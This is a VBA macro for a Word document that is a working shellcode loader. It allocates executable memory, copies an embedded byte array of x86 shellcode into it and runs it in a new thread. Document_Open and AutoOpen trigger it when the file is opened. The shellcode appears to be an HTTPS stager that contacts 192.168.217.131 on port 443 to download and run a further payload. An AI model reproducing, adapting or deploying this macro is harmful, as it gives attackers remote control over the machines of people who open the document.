Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long

    buf = Array(232,143,0,0,0,96,49,210,137,229,100,139,82,48,139,82,12,139,82,20,15,183,74,38,139,114,40,49,255,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192,116,76,1,208,139,88,32,80,139,72,24,1,211,133,201,116,60,49,255, _
73,139,52,139,1,214,49,192,193,207,13,172,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84, _
104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,62,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116,47,55,46,48,59,32,114,118,58,49,49,46,48,41,32,108,105,107,101,32,71,101,99,107,111, _
0,104,58,86,121,167,255,213,83,83,106,3,83,83,104,187,1,0,0,232,101,1,0,0,47,117,76,75,90,85,116,45,100,83,111,71,78,55,111,122,118,55,73,95,87,77,103,56,50,73,77,104,73,52,88,78,82,95,79,83,79,52,98,86,71,83,71,113,70,122,73,79,68,101,90,116,95,74,99,119, _
114,98,90,82,111,87,101,71,48,108,112,52,82,115,116,115,102,53,76,101,74,122,114,89,80,119,76,68,68,105,53,83,115,109,108,55,100,87,95,83,106,110,86,78,115,67,86,54,71,105,48,115,120,107,74,116,82,95,90,104,118,83,68,90,90,98,90,70,68,102,106,120,117,53,112,99,113,111,120,115, _
116,119,45,90,74,114,48,110,102,45,48,95,72,95,57,78,56,112,110,87,69,55,102,115,116,122,108,103,77,115,118,120,120,83,77,71,120,113,86,95,103,104,107,109,69,120,103,52,50,77,49,48,79,50,116,89,105,107,115,45,48,76,107,102,49,122,97,106,84,110,122,53,102,115,110,69,108,0,80,104, _
87,137,159,198,255,213,137,198,83,104,0,50,232,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4,80,106,31,86,104,117,70,158,134,255,213,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213,79, _
117,205,232,76,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,107,255,255,255,49,57,50,46,49,54,56,46,50,49,55,46,49, _
51,49,0,187,224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub